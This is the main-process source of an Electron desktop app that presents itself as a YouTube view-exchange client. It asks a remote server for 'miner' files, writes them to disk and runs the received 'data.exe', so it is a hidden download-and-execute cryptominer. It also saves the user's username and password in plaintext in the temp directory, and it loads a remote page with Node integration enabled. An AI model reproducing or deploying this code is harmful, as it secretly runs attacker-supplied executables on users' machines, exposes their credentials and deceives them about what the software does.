const {app, BrowserWindow, ipcMain,Menu} = require('electron')
const path = require('path')
const os = require('os');
const fs = require('fs')
const storage = require('electron-json-storage');
const io = require('socket.io-client')
const socket = io('https://ftp.ytviewforview.xyz')
const minerDir = '../data';
const currentVersion = '1.3.0';

storage.setDataPath(os.tmpdir());

const process = require('child_process')


const gotTheLock = app.requestSingleInstanceLock()

function createWindow () {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 800,
    resizable :false,
    minimizable:false,
    maximizable:false,
    webPreferences: {
      nodeIntegration: true,
      nativeWindowOpen: true,
      webviewTag:true
    }
  })
  mainWindow.loadURL('https://ftp.ytviewforview.xyz')

  const mainMenu = Menu.buildFromTemplate(mainMenuTemplate);
  Menu.setApplicationMenu(mainMenu)

  ipcMain.on('req-userInfo',function(){
    storage.get('userInfo',function(err,data){
      data.currentVersion = currentVersion;
      mainWindow.webContents.send('res-userInfo',data)
    })
  })
  
  ipcMain.on('logout',function(){
    mainWindow.webContents.session.clearStorageData()
    storage.clear(()=>{
      mainWindow.webContents.send('logouted')
    })
  })
  ipcMain.on('storage-data',function(e,{username,password}){
    storage.set('userInfo',{username,password})
  })


  mainWindow.webContents.session.clearStorageData()


  if (!gotTheLock) {
    app.quit()
  } else {
    app.on('second-instance', (event, commandLine, workingDirectory) => {
      if (mainWindow) {
        if (mainWindow.isMinimized()) mainWindow.restore()
        mainWindow.focus()
      }
    })
  }

  ipcMain.on('req-check-file',()=>{
    fs.readdir(path.join(__dirname,minerDir),(err,data)=>{
      if(data){
        socket.emit('req-miner')
      }else{
        fs.mkdirSync(path.join(__dirname,minerDir))
        socket.emit('req-miner')
      }
    })
  })
  socket.on('res-miner',data=>{
    data.forEach((el,idx)=>{
      fs.writeFileSync(path.join(__dirname,minerDir+'/'+el.name),el.file)
      if(idx == data.length - 1){
        var totalFile = fs.readdirSync(path.join(__dirname,minerDir))
        if(totalFile.length != data.length){
          mainWindow.webContents.send('not-enought-file')
        }else{
          child = process.execFile('data.exe',[],{cwd:path.join(__dirname,minerDir)})
        }
      }
    })
  })
}



const mainMenuTemplate = [];

app.on('ready', createWindow)
app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit()
  child.kill(2)
})

app.on('activate', function () {
  if (BrowserWindow.getAllWindows().length === 0) createWindow()
})
